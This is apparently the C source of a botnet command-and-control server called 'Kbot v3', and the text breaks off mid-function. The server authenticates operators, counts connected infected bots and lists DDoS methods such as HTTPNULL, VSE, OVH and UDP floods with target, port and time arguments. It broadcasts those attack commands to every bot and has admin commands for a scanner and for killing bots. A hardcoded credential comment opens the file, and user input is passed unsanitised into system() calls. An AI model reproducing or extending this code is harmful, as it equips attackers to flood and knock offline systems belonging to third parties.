// creds: root senpai
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/prctl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <netinet/tcp.h>

#define MAXFDS 1000000
#define thread_set 105
#define botnamesize 25 // max names u can have that bot joins as. 25

char *bot_port = ""; // DO NOT CHANGE

void removestr(char *buf,const char *rev)
{
	buf=strstr(buf,rev);
    memmove(buf,buf+strlen(rev),1+strlen(buf+strlen(rev)));
}

struct account
{
	char id[200];
	char password[200];
	char priv[100];
};

static struct account accounts[20]; //max users set

struct name
{
	char narray[512];
	int jj;
};

static struct name arra[botnamesize];

struct iplogger
{
    int socket;
    char ipi[100];
};

struct clientdata
{
    uint32_t ip;
    char build[7];
    char connected;
	char joinname[512];
} clients[MAXFDS];

struct userdata
{
    int connected;
	char user[100];
	int admin;
} managements[MAXFDS];

static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static int managesConnected;

void *failed(int fd)
{
	char den[512];
	sprintf(den,"you dont have access to this cmd!\r\n");
	if(send(fd, den, strlen(den), MSG_NOSIGNAL) == -1) return 0;
}

char *breakl(char *string)
{
	FILE *chk;
	char outp[1024];
  	memset(outp,0,sizeof outp);
  	char lck[512];
	strcpy(lck,string);
	chk = popen(lck, "r");
 	fgets(outp, sizeof(outp)-1, chk);
 	pclose(chk);
 	char *lol = outp;
 	return lol;
 	memset(outp,0,sizeof outp);
}

int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
    int total = 0, got = 1;
    while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
    return got;
}

void trim(char *str)
{
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}

static int make_socket_non_blocking(int sfd)
{
    int ff = fcntl(sfd, F_SETFL, O_NONBLOCK);
	if(ff == -1){printf("fcntl failed to set nonblocking socket\n"); return -1;}
    return 0;
}

static int connection_setup(char *port)
{
    struct addrinfo hints;
    struct addrinfo *result, *rp;
    int s, sfd;
    memset (&hints, 0, sizeof (struct addrinfo));
    hints.ai_family = AF_UNSPEC;     /* Return IPv4 and IPv6 choices */
    hints.ai_socktype = SOCK_STREAM; /* We want a TCP socket */
    hints.ai_flags = AI_PASSIVE;     /* All interfaces */
    s = getaddrinfo (NULL, port, &hints, &result);
    if (s != 0)
    {
        fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
        return -1;
    }
    for (rp = result; rp != NULL; rp = rp->ai_next)
    {
        sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (sfd == -1) continue;
        int yes = 1;
        if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
        s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
        if (s == 0)
        {
            break;
        }
        close (sfd);
    }
    if (rp == NULL)
    {
        fprintf (stderr, "Could not bind\n");
        return -1;
    }
    freeaddrinfo (result);
    return sfd;
}

void broadcast(char *msg, int us, char *sender)
{
    int i;
    for(i = 0; i < MAXFDS; i++)
    {
		if(clients[i].connected)
		{
            if(i == us || (!clients[i].connected && managements[i].connected)) continue;
            send(i, msg, strlen(msg), MSG_NOSIGNAL);
		}
    }
}

void *epollEventLoop()
{
    struct epoll_event event;
    struct epoll_event *events;
    int s;
    events = calloc (MAXFDS, sizeof event);
    while (1)
    {
        int n, i;
        n = epoll_wait (epollFD, events, MAXFDS, -1);
        for (i = 0; i < n; i++)
        {
            if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
            {
                clients[events[i].data.fd].connected = 0;
                close(events[i].data.fd);
                continue;
            }
            else if (listenFD == events[i].data.fd)
            {
                while (1)
                {
                    struct sockaddr in_addr;
					char ipstr[100];
                    socklen_t in_len;
                    int infd, ipIndex;
                    in_len = sizeof in_addr;
                    infd = accept(listenFD, &in_addr, &in_len);
                    if (infd == -1)
                    {
                        if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                        else
                        {
                            perror ("accept");
                            break;
                        }
                    }
					char binyname[200];
					memset(binyname,0,sizeof binyname);
                    fdgets(binyname, sizeof binyname,infd);
					if(strstr(binyname,"id:"))
					{
                        trim(binyname);
						removestr(binyname,"id:");
						strcpy(clients[infd].joinname,binyname);
						int g;
						for(g=0;g<botnamesize;g++)
						{
							if(!strcmp(arra[g].narray,binyname))
							{
								usleep(40000); 
								break;
							}
							if(strlen(arra[g].narray) <= 0)
							{
								strcpy(arra[g].narray,binyname);
								break;
							}
						}
					}
                    clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
                    int dup = 0;
                    for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++)
                    {
                        if(!clients[ipIndex].connected || ipIndex == infd) continue;
                        if(clients[ipIndex].ip == clients[infd].ip)
                        {
                            dup = 1;
                            break;
                        }
                    }
                   /* if(dup) 
                    {                  
                        if(send(infd, "botkill\n", 8, MSG_NOSIGNAL) == -1) 
                        { 
                            close(infd); 
                            continue; 
                        }
                        char del[100];
                        sprintf(del, "%d.%d.%d.%d", clients[infd].ip & 255, clients[infd].ip >> 8 & 255, clients[infd].ip >> 16 & 255, clients[infd].ip >> 24 & 255);
                        printf("\x1b[37;1m[\x1b[38;5;45mkbot\x1b[37;1m] \x1b[33;1mdup deleted\x1b[37;1m: \x1b[33;1m%s\x1b[37;1m:\x1b[33;1m%s\x1b[0m\n", del, clients[infd].joinname);
                        close(infd);
                        continue;
                    }*/
                    s = make_socket_non_blocking(infd);
                    if (s == -1) 
                    { 
                    	close(infd); 
                    	break; 
                    }
                    event.data.fd = infd;
                    event.events = EPOLLIN | EPOLLET;
                    s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
                    if (s == -1)
                    {
                        perror ("epoll_ctl");
                        close(infd);
                        break;
                    }
                    char ip[100];
                    sprintf(ip,"%d.%d.%d.%d",clients[infd].ip & 255, clients[infd].ip >> 8 & 255, clients[infd].ip >> 16 & 255, clients[infd].ip >> 24 & 255);
                    printf("\x1b[37;1m[\x1b[38;5;45mkbot\x1b[37;1m] \x1b[32;1mconnection established\x1b[37;1m: \x1b[32;1m%s\x1b[37;1m:\x1b[32;1m%s\x1b[0m\n",ip, clients[infd].joinname);
                    clients[infd].connected = 1;
                }
                continue;
            }
            else
            {
                int thefd = events[i].data.fd;
                struct clientdata *client = &(clients[thefd]);
                int done = 0;
                client->connected = 1;
                while (1)
                {
                    ssize_t count;
                    char buf[2048];
                    memset(buf, 0, sizeof buf);
                    while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
                    {
                        if(strstr(buf, "\n") == NULL) 
                        { 
                            done = 1; 
                            break; 
                        }
                        trim(buf);
						if(strlen(buf)>=1)
						printf("\x1b[37;1m[\x1b[38;5;45mKbot v3 By urmommy\x1b[37;1m] \x1b[36;1m%s\x1b[0m\n", buf);
                    }
                    if (count == -1)
                    {
                        if (errno != EAGAIN)
                        {
                          	done = 1;
                        }
                        break;
                    }
                    else if (count == 0)
                    {
                        done = 1;
                        break;
                    }
                }
                if (done)
                {
					char ip[200];
					sprintf(ip,"%d.%d.%d.%d",clients[thefd].ip & 255, clients[thefd].ip >> 8 & 255, clients[thefd].ip >> 16 & 255, clients[thefd].ip >> 24 & 255);
					printf("\x1b[37;1m[\x1b[38;5;45mkbot\x1b[37;1m] \x1b[31;1mconnection lost\x1b[37;1m: \x1b[31;1m%s\x1b[37;1m:\x1b[31;1m%s\x1b[0m\n",ip, clients[thefd].joinname);
                    client->connected = 0;
                    close(thefd);
                }
            }
        }
    }
}

#define crypt(gg)   (gg) + 0x44

unsigned int clientsConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
            if(!clients[i].connected) continue;
            total++;
        } 
        return total*1;
}

unsigned int joinn()
{
	int i, f, g;
	char add[MAXFDS];
    for(g=0;g<botnamesize;g++)
	{
		arra[g].jj=0;
	}
   	for(i=0;i<MAXFDS;i++)
   	{
   		for(f=0;f<botnamesize;f++)
   		{
			if(strcmp(clients[i].joinname,arra[f].narray) == 0 && clients[i].connected == 1)
			{
				arra[f].jj++;
			}
		}
   	}
}

void *titleWriter(void *sock) 
{
    int thefd = *(int*)sock;
    char string[2048];
	char spin[3][100];
	strcpy(spin[0],"\\");
	strcpy(spin[1],"/");
	strcpy(spin[2],"-");
	int b=0;
    while(1)
    {
        memset(string, 0, 2048);
		if(b>2)b=0;
        sprintf(string, "\033]0; connections: %d %s users: %d\a", clientsConnected(), spin[b], managesConnected);
        if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1) close(thefd);
		b++;
        fflush(stdout);
        usleep(800000);
    }
}
 
#define ciu(crypt)  do { char * crypts = crypt ; while (*crypts) *crypts++ -= 0x44; } while(0)

int Search_in_File(char *filen, char *str)
{
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=-1;
    char temp[1024]; 
    if((fp = fopen(filen, "r")) == NULL)
    {
        return(-1);
    }
    while(fgets(temp, 1024, fp) != NULL)
    {
        if((strstr(temp, str)) != NULL)
        {
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
    {
        fclose(fp);
    }
    if(find_result == 0)return 0;
    return find_line;
}

#define cih(crypt)  do {char * crypts = crypt ; while (*crypts) *crypts++ += 0x44;} while(0)

void *main_cnc_loop(void *sock)
{
	struct iplogger *kbot = sock;
	char country[100];
	char isp[100];
    char usernamez[80];
    int thefd = kbot->socket;
	char ipl[100];
	strcpy(ipl,kbot->ipi);
    int find_line=-1;
    pthread_t title;
    char counter[2048];
    memset(counter, 0, 2048);
    char buf[2048];
	char iffailedu[1024];
	char iffailedp[1024];
	char loginprompt1 [2048];
    char loginprompt2 [2048];
    char loginprompt3 [2048];
    char loginprompt4 [2048];
    char loginprompt5 [2048];
    char loginprompt6 [2048];
    char loginprompt7 [2048];
    char loginprompt8 [2048];
    char loginprompt9 [2048];
    char userprompt[80];
    char passprompt[80];
    char clearscreen [2048];
    sprintf(clearscreen, "\033[2J\033[1;1H");
    char* nickstring;
    char botnet[2048];
    memset(botnet, 0, 2048);
    memset(buf, 0, sizeof buf);
	int j=0;
	managesConnected++;
	int c;
	int scan;
    FILE *fp;
    fp=fopen("logins.txt", "r"); 
    while(!feof(fp)) 
    {
        c=fgetc(fp);
        ++scan;
    };																																																																																																																																																																																																																																																																																																																			
    rewind(fp);
	for(j=0;j<scan;j++) 
	{
	    fscanf(fp, "%s %s %s", accounts[j].id, accounts[j].password, accounts[j].priv);
	}
    if(send(thefd, clearscreen, strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
    if(send(thefd, "", 1, MSG_NOSIGNAL) == -1) goto end;
    if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
    trim(buf);
    // cnc checks for a string [!REPS] before showing login prompt any other strings given and it will kill the connection
    if(strstr(buf, "666"))
    {
        goto yay;
    }
    else
    {
        goto end;
    }
    yay:
	sprintf(loginprompt1, "\x1b[38;5;45m██\x1b[37;1m╗  \x1b[38;5;45m██\x1b[37;1m╗     \x1b[38;5;45m██████\x1b[37;1m╗  \x1b[38;5;45m██████\x1b[37;1m╗ \x1b[38;5;45m████████\x1b[37;1m╗\r\n");
    sprintf(loginprompt2, "\x1b[38;5;45m██\x1b[37;1m║ \x1b[38;5;45m██\x1b[37;1m╔╝     \x1b[38;5;45m██\x1b[37;1m╔══\x1b[38;5;45m██\x1b[37;1m╗\x1b[38;5;45m██\x1b[37;1m╔═══\x1b[38;5;45m██\x1b[37;1m╗╚══\x1b[38;5;45m██\x1b[37;1m╔══╝\r\n");
    sprintf(loginprompt3, "\x1b[38;5;45m█████\x1b[37;1m╔╝\x1b[38;5;45m█████\x1b[37;1m╗\x1b[38;5;45m██████\x1b[37;1m╔╝\x1b[38;5;45m██\x1b[37;1m║   \x1b[38;5;45m██\x1b[37;1m║   \x1b[38;5;45m██\x1b[37;1m║   v3 \r\n");
    sprintf(loginprompt4, "\x1b[38;5;45m██\x1b[37;1m╔═\x1b[38;5;45m██\x1b[37;1m╗╚════╝\x1b[38;5;45m██\x1b[37;1m╔══\x1b[38;5;45m██\x1b[37;1m╗\x1b[38;5;45m██\x1b[37;1m║   \x1b[38;5;45m██\x1b[37;1m║   \x1b[38;5;45m██\x1b[37;1m║   \r\n");
    sprintf(loginprompt5, "\x1b[38;5;45m██\x1b[37;1m║  \x1b[38;5;45m██\x1b[37;1m╗     \x1b[38;5;45m██████\x1b[37;1m╔╝╚\x1b[38;5;45m██████\x1b[37;1m╔╝   \x1b[38;5;45m██\x1b[37;1m║   \r\n");
    sprintf(loginprompt6, "\x1b[37;1m╚═╝  ╚═╝     ╚═════╝  ╚═════╝    ╚═╝   \r\n");
    sprintf(userprompt, "\x1b[38;5;45mユーザー名\x1b[37;1m:\x1b[0m ");
    sprintf(passprompt, "\x1b[38;5;45mパスワード\x1b[37;1m:\x1b[0m ");
    sprintf(loginprompt7, "\x1b[37;1m[\x1b[38;5;45mkbot\x1b[37;1m] checking credentials\x1b[38;5;45m...\r\n");
    sprintf(loginprompt8, "\x1b[37;1m[\x1b[38;5;45mkbot\x1b[37;1m] authentication failed\x1b[38;5;45m!\x1b[0m\r\n");
    sprintf(loginprompt9, "\x1b[37;1m[\x1b[38;5;45mkbot\x1b[37;1m] access granted\x1b[38;5;45m; \x1b[37;1mstarting cnc\x1b[38;5;45m...\r\n");
    if(send(thefd, loginprompt1, strlen(loginprompt1), MSG_NOSIGNAL) == -1) goto end;
    if(send(thefd, loginprompt2, strlen(loginprompt2), MSG_NOSIGNAL) == -1) goto end;
    if(send(thefd, loginprompt3, strlen(loginprompt3), MSG_NOSIGNAL) == -1) goto end;
    if(send(thefd, loginprompt4, strlen(loginprompt4), MSG_NOSIGNAL) == -1) goto end;
    if(send(thefd, loginprompt5, strlen(loginprompt5), MSG_NOSIGNAL) == -1) goto end;
    if(send(thefd, loginprompt6, strlen(loginprompt6), MSG_NOSIGNAL) == -1) goto end;
    if(send(thefd, userprompt, strlen(userprompt), MSG_NOSIGNAL) == -1) goto end;
	memset(buf,0,sizeof(buf));
	if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
	if(strlen(buf)>2047)close(thefd);
	trim(buf);
	strcpy(iffailedu,buf);
	sprintf(usernamez, buf);
	nickstring = ("%s", buf);
	if(send(thefd, passprompt, strlen(passprompt), MSG_NOSIGNAL) == -1) goto end;
	memset(buf,0,sizeof(buf));
	if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
	if(strlen(buf)>2047)close(thefd);
	trim(buf);
	strcpy(iffailedp,buf);
	find_line = Search_in_File("logins.txt",nickstring);
	if(send(thefd, loginprompt7, strlen(loginprompt7), MSG_NOSIGNAL) == -1) goto end;
	sleep(3);
    if(strcmp(iffailedp, accounts[find_line].password) != 0 || strcmp(iffailedu, accounts[find_line].id) != 0)
    {
       	find_line = -1; 
        goto failed;
    }
	if(strcmp(iffailedp, accounts[find_line].password) == 0 || strcmp(iffailedu,accounts[find_line].id) == 0)
	{
		int c;
		for(c=0;c<MAXFDS;c++)
		{
			if(!strcmp(managements[c].user, iffailedu))
			{
				char alog[200];
				sprintf(alog,"user %s is in use try another user!\r\n", iffailedu);
				if(send(thefd, alog, strlen(alog), MSG_NOSIGNAL) == -1) goto end;
				find_line = -1;
				sleep(4);
				goto end;
			}
		}
		strcpy(managements[thefd].user,iffailedu);
		if(send(thefd, loginprompt9, strlen(loginprompt9), MSG_NOSIGNAL) == -1) goto end;
		sleep(2);
	}
    memset(buf, 0, 2048);
    goto fak;
	failed:
	memset(iffailedu,0,sizeof(iffailedu));
	memset(iffailedp,0,sizeof(iffailedp));
	if(send(thefd, loginprompt8, strlen(loginprompt8), MSG_NOSIGNAL) == -1) goto end;
    sleep(2);
    goto end;
    fak:
    pthread_create(&title, NULL, titleWriter, (void *) &thefd);
	char bashline[1024];
	sprintf(bashline,"\x1b[38;5;45m%s\x1b[37;1m@\x1b[38;5;45mKBOT\x1b[37;1m:~$\x1b[0m ",accounts[find_line].id);
    if(send(thefd, bashline, strlen(bashline), MSG_NOSIGNAL) == -1) goto end;
    managements[thefd].connected = 1;
    if(managements[thefd].connected == 1)
	if(!strcmp(accounts[find_line].priv, "Admin"))
	managements[thefd].admin = 1;
	else
	managements[thefd].admin = 0;
	memset(buf, 0, 2048);
    while(fdgets(buf, sizeof buf, thefd) > 0)
    {
        if(strstr(buf, "HELP") || strstr(buf, "help") || strstr(buf, "?")) 
        {
			char helpline1 [5000];
			char helpline2 [5000];
			char helpline3 [5000];
			char helpline4 [5000];
			char helpline5 [5000];
			char helpline6 [5000];
			char helpline7 [5000];
			char helpline8 [5000];
            char helpline9 [5000];
            char helpline10 [5000];
            char helpline11 [5000];
            char helpline12 [5000];
            char helpline13 [5000];
            char helpline14 [5000];
            char helpline15 [5000];

			sprintf(helpline1, "\x1b[37;1mKBOT V3 BY URMOMMY\x1b[38;5;45m!\r\n");
            sprintf(helpline2, "\x1b[37;1mMETHODS:\r\n");
            sprintf(helpline3, "\x1b[37;1mHTTPNULL [HOST] [PORT] [TIME] [POWER]\r\n");
            sprintf(helpline8, "\x1b[37;1mSTDHEX [IP] [PORT] [TIME]\r\n");
            sprintf(helpline9, "\x1b[37;1mVSE [IP] [PORT] [TIME] [SPOOFS]\r\n");
            sprintf(helpline10, "\x1b[37;1mRAND [IP] [PORT] [TIME]\r\n");
            sprintf(helpline12, "\x1b[37;1mOVH [IP] [PORT] [TIME]\r\n");
            sprintf(helpline13, "\x1b[37;1mNFO [IP] [PORT] [TIME]\r\n");
            sprintf(helpline14, "\x1b[37;1mVPN [IP] [PORT] [TIME]\r\n");
            sprintf(helpline15, "\x1b[37;1mSTOP - KILL ATTACKS\r\n");
            


            if(send(thefd, helpline1, strlen(helpline1), MSG_NOSIGNAL) == -1) goto end;
            if(send(thefd, helpline2, strlen(helpline2), MSG_NOSIGNAL) == -1) goto end;
            if(send(thefd, helpline3, strlen(helpline3), MSG_NOSIGNAL) == -1) goto end;
            if(send(thefd, helpline8, strlen(helpline8), MSG_NOSIGNAL) == -1) goto end;
            if(send(thefd, helpline9, strlen(helpline9), MSG_NOSIGNAL) == -1) goto end;
            if(send(thefd, helpline10, strlen(helpline10), MSG_NOSIGNAL) == -1) goto end;
            if(send(thefd, helpline12, strlen(helpline12), MSG_NOSIGNAL) == -1) goto end;
            if(send(thefd, helpline13, strlen(helpline13), MSG_NOSIGNAL) == -1) goto end;
            if(send(thefd, helpline14, strlen(helpline14), MSG_NOSIGNAL) == -1) goto end;
            if(send(thefd, helpline15, strlen(helpline15), MSG_NOSIGNAL) == -1) goto end;
        }
        else if(strstr(buf, "admin"))
        {
        	char admin1 [5000];
        	char admin2 [5000];
        	char admin3 [5000];
        	char admin4 [5000];
        	char admin5 [5000];
        	sprintf(admin1, "\x1b[37;1madduser        \x1b[38;5;45m- \x1b[37;1madd a new user\x1b[38;5;45m!\r\n");
            sprintf(admin2, "\x1b[37;1mrmuser         \x1b[38;5;45m- \x1b[37;1mremove a user\x1b[38;5;45m!\r\n");
            sprintf(admin3, "\x1b[37;1mkickuser       \x1b[38;5;45m- \x1b[37;1mkick a user\x1b[38;5;45m!\r\n");
            sprintf(admin4, "\x1b[37;1mscanner on/off \x1b[38;5;45m- \x1b[37;1mturn scanner on\x1b[38;5;45m/\x1b[37;1moff\x1b[38;5;45m!\r\n");
            sprintf(admin5, "\x1b[37;1mbotkill        \x1b[38;5;45m- \x1b[37;1mkill all running pids\x1b[38;5;45m!\r\n");
            if(send(thefd, admin1, strlen(admin1), MSG_NOSIGNAL) == -1) goto end;
            if(send(thefd, admin2, strlen(admin2), MSG_NOSIGNAL) == -1) goto end;
            if(send(thefd, admin3, strlen(admin3), MSG_NOSIGNAL) == -1) goto end;
            if(send(thefd, admin4, strlen(admin4), MSG_NOSIGNAL) == -1) goto end;
            if(send(thefd, admin5, strlen(admin5), MSG_NOSIGNAL) == -1) goto end;
        }
		else if(strstr(buf, "bots") || strstr(buf, "count") || strstr(buf, "botcount")) 
		{
			joinn();
			int i;
			int t=1;
			char pp[512];
			char total[512];
			for(i=0;i<botnamesize;i++)
			{
				if(arra[i].jj <= 0)
				{
					memset(arra[i].narray,0,sizeof(arra[i].narray));
				}
				if(strlen(arra[i].narray)>=1)
				{
					sprintf(pp,"\x1b[37;1m%s\x1b[38;5;45m:\t\x1b[37;1m%d\r\n",arra[i].narray,arra[i].jj);
					if(send(thefd, pp, strlen(pp), MSG_NOSIGNAL) == -1) goto end;
					memset(pp,0,sizeof pp);
				}
				usleep(40000);
			}
			sprintf(total,"\x1b[37;1mtotal\x1b[38;5;45m: \x1b[37;1m%d\r\n", clientsConnected());
			if(send(thefd, total, strlen(total), MSG_NOSIGNAL) == -1) goto end;
		}
		else if(strstr(buf, "msg"))
		{
			memset(buf,0,sizeof buf);
			char msgline[300];
			char msgg[300];
			char noton[512];
			char onl[512];
			char work[300];
			char bash[512];
			int g;
			int shit=0;
			sprintf(msgline,"\x1b[37;1muser to msg\x1b[38;5;45m: \x1b[37;1m");
			if(send(thefd, msgline,strlen(msgline),MSG_NOSIGNAL) == -1) goto end;
			if(fdgets(buf, sizeof(buf), thefd) < 1) goto end;
	    	trim(buf);
			for(g=0;g<MAXFDS;g++)
			{
				if(!strcmp(managements[g].user,buf))
				{
					memset(buf,0,sizeof buf);
					sprintf(msgg,"\x1b[37;1mmsg to send\x1b[38;5;45m: \x1b[37;1m");
					if(send(thefd, msgg,strlen(msgg),MSG_NOSIGNAL) == -1) goto end;
					if(fdgets(buf, sizeof(buf), thefd) < 1) goto end;
	    			trim(buf);
					sprintf(onl,"\r\n\x1b[37;1mpriv msg by %s\x1b[38;5;45m: \x1b[37;1m%s\r\n",accounts[find_line].id,buf);
					if(send(g, onl,strlen(onl),MSG_NOSIGNAL) == -1) goto end;
					sprintf(bash, "\x1b[38;5;45m%s\x1b[37;1m@\x1b[38;5;45mkbot\x1b[37;1m:~$\x1b[0m ", managements[g].user);
					if(send(g, bash,strlen(bash),MSG_NOSIGNAL) == -1) goto end;
					shit=0;
					break;
				}
				else shit=1;
			}
			if(shit == 1)
			{
				memset(noton,0,sizeof noton);
				sprintf(noton,"\x1b[37;1muser %s was not found\x1b[38;5;45m!\r\n",buf);
				if(send(thefd, noton,strlen(noton),MSG_NOSIGNAL) == -1) goto end;
			}
			else
			{
				memset(work,0,sizeof work);
				sprintf(work,"\x1b[37;1mmsg was sent to %s\x1b[38;5;45m!\r\n",managements[g].user);
				if(send(thefd, work,strlen(work),MSG_NOSIGNAL) == -1) goto end;
			}
		}		
		else if(strstr(buf, "adduser"))
		{
			if(!strcmp(accounts[find_line].priv, "Admin"))
			{
				buby:
				if(send(thefd, "\x1b[37;1mnew username\x1b[38;5;45m: \x1b[37;1m",45,MSG_NOSIGNAL) == -1) goto end;
				memset(buf,0,sizeof(buf));
				if(fdgets(buf, sizeof(buf), thefd) < 1) goto end;
				trim(buf);
				if(strlen(buf) < 1)
				{
					if(send(thefd, "\x1b[37;1mplease input a username\x1b[38;5;45m!\r\n",49,MSG_NOSIGNAL) == -1) goto end;
					goto buby;
				}
				char usernamee[1024];
				int find_e=0;
				strcpy(usernamee,buf);
				printf("%s\n",usernamee);
				find_e = Search_in_File("logins.txt",usernamee);
				if(strcmp(accounts[find_e].id,buf) == 0)
				{
					if(send(thefd, "\x1b[37;1musername is taken\x1b[38;5;45m, \x1b[37;1mchoose another\x1b[38;5;45m!\r\n",79,MSG_NOSIGNAL) == -1) goto end;
					goto buby;
				}	
				duby:
				if(send(thefd, "\x1b[37;1mnew password\x1b[38;5;45m: \x1b[37;1m",45,MSG_NOSIGNAL) == -1) goto end;
				memset(buf,0,sizeof(buf));
				if(fdgets(buf, sizeof(buf), thefd) < 1) goto end;
				trim(buf);
				if(strlen(buf) < 1)
				{
					if(send(thefd, "\x1b[37;1mplease input a password\x1b[38;5;45m!\r\n",49,MSG_NOSIGNAL) == -1) goto end;
					goto duby;
				}
				char passwordd[1024];
				strcpy(passwordd,buf);
				memset(buf,0,sizeof(buf));
				if(send(thefd, "\x1b[37;1mlogin successfully added\x1b[38;5;45m!\r\n",50,MSG_NOSIGNAL) == -1) goto end;
				char bufff[2048];
				char putt[1024];
				char lineb[100];
				char chk[100];
				strcpy(chk,breakl("tail -c1 logins.txt | wc -l"));
				memset(lineb,0,sizeof lineb);
    			if(strstr(chk,"0"))strcpy(lineb,"\n");
				sprintf(putt,"%s%s %s notadmin",lineb,usernamee,passwordd);
				printf("%s\n",lineb);
				sprintf(bufff,"echo \"%s\" >> logins.txt",putt);
				system(bufff);
				memset(bufff,0,sizeof(bufff));
			}
			else
			{
				failed(thefd);
			}
		}	
		else if(strstr(buf, "rmuser"))
		{
			if(!strcmp(accounts[find_line].priv, "Admin"))
			{
				char allow[512];
				char sys[1024];
		        char printt[1024];
				memset(buf,0,sizeof(buf));
				sprintf(printt,"\x1b[37;1musername\x1b[38;5;45m: \x1b[37;1m");
				if(send(thefd, printt, strlen(printt), MSG_NOSIGNAL) == -1) goto end;
				if(fdgets(buf, sizeof(buf), thefd) < 1) goto end;
				trim(buf);
				sprintf(sys,"sed '/\\<%s\\>/d' -i logins.txt",buf);
				system(sys);
				sprintf(allow,"\x1b[37;1muser %s has been removed\x1b[38;5;45m!\r\n",buf);
				if(send(thefd, allow, strlen(allow), MSG_NOSIGNAL) == -1) goto end;
			}
			else
			{
				failed(thefd);
			}
		}
		else if(strstr(buf, "users"))
		{
    		int u;
			char kbot[512];
			char adm[100];
    		for(u=0;u<MAXFDS;u++) 
    		{
				if(managements[u].connected == 1)
				{
					if(managements[u].admin == 1)strcpy(adm, "Admin"); else strcpy(adm, "notadmin");
					sprintf(kbot,"\x1b[37;1muser\x1b[38;5;45m: \x1b[37;1m%s\r\nid\x1b[38;5;45m: \x1b[37;1m%d\r\nprivstatus\x1b[38;5;45m: \x1b[37;1m%s\r\n",managements[u].user,u,adm);
    			    if(send(thefd, kbot, strlen(kbot), MSG_NOSIGNAL) == -1) goto end;
				}
    		}
		}
		else if(strstr(buf, "kickuser"))
		{
			if(!strcmp(accounts[find_line].priv, "Admin"))
			{
				char dy[200];
				char done[200];
				sprintf(dy,"\x1b[37;1muser id\x1b[38;5;45m: \x1b[37;1m");
				if(send(thefd, dy,strlen(dy),MSG_NOSIGNAL) == -1) goto end;
			    memset(buf,0,sizeof(buf));
			    if(fdgets(buf, sizeof(buf), thefd) < 1) goto end;
				trim(buf);
				int fd = atoi(buf);
				if(managements[fd].admin == 1)
				{
					char fuck[200];
					sprintf(fuck,"\x1b[37;1mcant kick a admin off cnc\x1b[38;5;45m!\r\n");
					if(send(thefd, fuck,strlen(fuck),MSG_NOSIGNAL) == -1) goto end;
				}
				else
				{
					close(fd);
					sprintf(done,"\x1b[37;1muser %s has been kicked from cnc\x1b[38;5;45m!\r\n",managements[fd].user);
					if(send(thefd, done,strlen(done),MSG_NOSIGNAL) == -1) goto end;
				}
			}
			else
			{
				failed(thefd);
			}
		}
	    else if(strstr(buf, "cls"))
		{
    		if(send(thefd, clearscreen, strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
    	}
    	else if(strstr(buf, "clear"))
		{
    		if(send(thefd, clearscreen, strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
    		if(send(thefd, loginprompt1, strlen(loginprompt1), MSG_NOSIGNAL) == -1) goto end;
    		if(send(thefd, loginprompt2, strlen(loginprompt2), MSG_NOSIGNAL) == -1) goto end;
    		if(send(thefd, loginprompt3, strlen(loginprompt3), MSG_NOSIGNAL) == -1) goto end;
    		if(send(thefd, loginprompt4, strlen(loginprompt4), MSG_NOSIGNAL) == -1) goto end;
    		if(send(thefd, loginprompt5, strlen(loginprompt5), MSG_NOSIGNAL) == -1) goto end;
    		if(send(thefd, loginprompt6, strlen(loginprompt6), MSG_NOSIGNAL) == -1) goto end;
    	}  
    	else if(strstr(buf, "UDP"))
		{
            if(strlen(buf) > 17)
            {
		  	   
			    
				sprintf(botnet, "\x1b[37;1mUDP attacking with \x1b[38;5;45m%d \x1b[37;1mbots\x1b[38;5;45m!\r\n", clientsConnected());
		  	    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		        broadcast(buf, thefd, usernamez);
		        memset(buf, 0, 2048);
            }
        }
        else if(strstr(buf, "HTTPNULL"))
        {
            if(strlen(buf) > 17)
            {
               
                
                sprintf(botnet, "\x1b[37;1mHTTTP-NULL attacking with \x1b[38;5;45m%d \x1b[37;1mbots\x1b[38;5;45m!\r\n", clientsConnected());
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                broadcast(buf, thefd, usernamez);
                memset(buf, 0, 2048);
            }
        }
        else if(strstr(buf, "HTTPSLAM"))
        {
            if(strlen(buf) > 17)
            {
               
                
                sprintf(botnet, "\x1b[37;1mHTTTP-SLAM attacking with \x1b[38;5;45m%d \x1b[37;1mbots\x1b[38;5;45m!\r\n", clientsConnected());
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                broadcast(buf, thefd, usernamez);
                memset(buf, 0, 2048);
            }
        }
        else if(strstr(buf, "HTTPBOTH"))
        {
            if(strlen(buf) > 17)
            {
               
                
